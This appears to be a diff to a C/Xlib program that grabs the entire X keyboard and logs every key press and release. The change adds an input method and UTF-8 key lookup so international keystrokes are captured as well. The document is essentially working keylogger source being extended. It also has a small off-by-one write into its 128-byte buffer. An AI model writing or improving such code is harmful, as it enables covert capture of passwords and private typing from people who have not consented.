@@ -1,5 +1,6 @@
 #include <X11/Xlib.h>
 #include <X11/keysym.h>
+#include <X11/Xutil.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
@@ -26,23 +27,28 @@ void log_key(const char *event, const char *key) {
 }
 
 // Function to get a string representation of the key
-char *get_key_string(XKeyEvent *event, Display *display) {
+char* get_key_string(XKeyEvent *event, XIC xic) {
     static char buf[128];
     KeySym keysym;
-    int len = XLookupString(event, buf, sizeof(buf), &keysym, NULL);
-    
-    // If no printable key found, return key symbol name (e.g., Shift_L, Control)
-    if (len == 0) {
-        snprintf(buf, sizeof(buf), "%s", XKeysymToString(keysym));
-    }
+    int len;
 
-    return buf;
+    // Use Xutf8LookupString instead of XLookupString
+    len = Xutf8LookupString(xic, event, buf, sizeof(buf), &keysym, NULL);
+
+    if (len > 0) {
+        buf[len] = '\0';
+        return buf;
+    } else {
+        return XKeysymToString(keysym);
+    }
 }
 
 int main() {
     Display *display;
     Window root;
     XEvent event;
+    XIM xim;
+    XIC xic;
 
     // Open connection to X server
     display = XOpenDisplay(NULL);
@@ -52,6 +58,20 @@ int main() {
     }
 
     root = DefaultRootWindow(display);
+
+    // Initialize input methods for handling international input
+    xim = XOpenIM(display, NULL, NULL, NULL);
+    if (!xim) {
+        fprintf(stderr, "Failed to open input method\n");
+        exit(1);
+    }
+
+    xic = XCreateIC(xim, XNInputStyle, XIMPreeditNothing | XIMStatusNothing, XNClientWindow, root, NULL);
+
+    if (!xic) {
+        fprintf(stderr, "Failed to create input context\n");
+        exit(1);
+    }
 
     // Grab the entire keyboard
     XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);
@@ -63,14 +83,15 @@ int main() {
     while (1) {
         XNextEvent(display, &event);
         if (event.type == KeyPress) {
-            char *key = get_key_string(&event.xkey, display);
+            char *key = get_key_string(&event.xkey, xic);
             log_key("Key Pressed", key);
         } else if (event.type == KeyRelease) {
-            char *key = get_key_string(&event.xkey, display);
+            char *key = get_key_string(&event.xkey, xic);
             log_key("Key Released", key);
         }
     }
 
+    XCloseIM(xim);
     XCloseDisplay(display);
     return 0;
 }
